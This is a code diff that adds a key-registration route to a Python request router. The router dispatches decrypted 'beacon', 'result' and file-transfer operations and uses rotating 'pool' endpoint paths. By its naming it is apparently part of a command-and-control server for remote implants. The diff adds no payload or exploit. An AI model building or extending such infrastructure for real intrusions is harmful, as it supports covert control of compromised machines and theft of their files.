@@ -25,6 +25,7 @@ class OperationRouter:
         from handlers.file_handler import FileHandler
         from handlers.result_handler import ResultHandler
         from handlers.file_download_handler import FileDownloadHandler
+        from handlers.key_registration_handler import KeyRegistrationHandler  # Import the new handler
         
         # Initialize handlers
         self.beacon_handler = BeaconHandler(
@@ -60,6 +61,15 @@ class OperationRouter:
         )
         
         self.file_download_handler = FileDownloadHandler(
+            request_handler, 
+            client_manager, 
+            crypto_helper, 
+            client_helper, 
+            path_router
+        )
+        
+        # Add the new key registration handler
+        self.key_registration_handler = KeyRegistrationHandler(
             request_handler, 
             client_manager, 
             crypto_helper, 
@@ -238,12 +248,12 @@ class OperationRouter:
                 # Extract operation type
                 operation_type = payload.get("op_type", "beacon")  # Default to beacon
                 operation_data = payload.get("payload", {})
-                
+
                 logger.info(f"Operation router: Identified operation type: {operation_type}")
-                
+
                 # Store the decrypted payload for use by handlers
                 self.request_handler.decrypted_payload = operation_data
-                
+
                 # Route to appropriate handler based on operation type
                 if operation_type == "beacon":
                     logger.info(f"Routing to beacon_handler based on op_type")
@@ -251,6 +261,9 @@ class OperationRouter:
                 elif operation_type == "result":
                     logger.info(f"Routing to result_handler based on op_type")
                     self.result_handler.handle()
+                elif operation_type == "key_register":  # New operation type for key registration
+                    logger.info(f"Routing to key_registration_handler based on op_type")
+                    self.key_registration_handler.handle()
                 elif operation_type == "file_up":
                     # Handle file upload FROM client TO server (saving to downloads folder)
                     logger.info(f"Routing to file_handler based on op_type (file_up)")
@@ -268,7 +281,11 @@ class OperationRouter:
                 else:
                     # Default based on path pattern
                     logger.info(f"No matching op_type, using endpoint type: {endpoint_type}")
-                    if endpoint_type in ["pool_path", "previous_pool_path", "old_pool_path"]:
+                    # Additional detection for key registration
+                    if isinstance(operation_data, dict) and ('encrypted_key' in operation_data or 'client_key' in operation_data):
+                        logger.info(f"Detected key registration operation by payload content")
+                        self.key_registration_handler.handle()
+                    elif endpoint_type in ["pool_path", "previous_pool_path", "old_pool_path"]:
                         self.beacon_handler.handle()
                     elif self._looks_like_file_operation(path):
                         # Determine if it's a download or upload based on context
